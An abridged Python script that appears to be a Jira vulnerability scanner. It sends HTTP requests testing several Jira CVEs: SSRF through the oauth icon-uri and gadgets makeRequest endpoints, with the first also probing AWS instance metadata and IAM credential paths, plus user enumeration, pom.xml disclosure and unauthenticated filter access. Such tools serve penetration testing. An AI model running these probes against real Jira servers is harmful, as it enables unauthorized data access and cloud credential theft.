...
def CVE_2017_9506(base_url):  # (SSRF):
    ...
    r = requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}", allow_redirects=False,
                     headers=headers)
    if r.status_code == 200 and "googlelogo" in str(r.content):
        ...
        if is_aws:
            ...
            r = requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_INSTANCE}",
            ...
            r = requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_METADATA}",
                             allow_redirects=False, headers=headers)
            ...
            r = requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_IAM_DATA}",
                             allow_redirects=False, headers=headers)
        ...
        r = requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}",
                         allow_redirects=False, headers=headers)
        if r.status_code == 200:
            print(
...
def CVE_2019_8449(base_url):  # User Info Disclosure:
    r = requests.get(f"{base_url}/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true",
                     allow_redirects=False, headers=headers)
    # print(str(r.content))
    if r.status_code == 200:
...
def CVE_2019_8442(base_url):  # (Sensitive info disclosure):
    r = requests.get(f"{base_url}/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml",
                     allow_redirects=False, headers=headers)
    if r.status_code != 200:
...
def CVE_2019_8451(base_url):  # (SSRF):
    to_load = "https://google.com"
    r = requests.get(f"{base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}", allow_redirects=False,
                     headers=headers)
    if r.status_code == 200 and "googlelogo" in str(r.content):
        print(
...
def Unauth_Dashboard_Popular(base_url):
    r = requests.get(f"{base_url}/secure/ManageFilters.jspa?filter=popular&filterView=popular", allow_redirects=False,
                     headers=headers)
    if r.status_code == 200:
...
def main():
    try:
        ...
        if args.url is not None and args.input_file is not None:
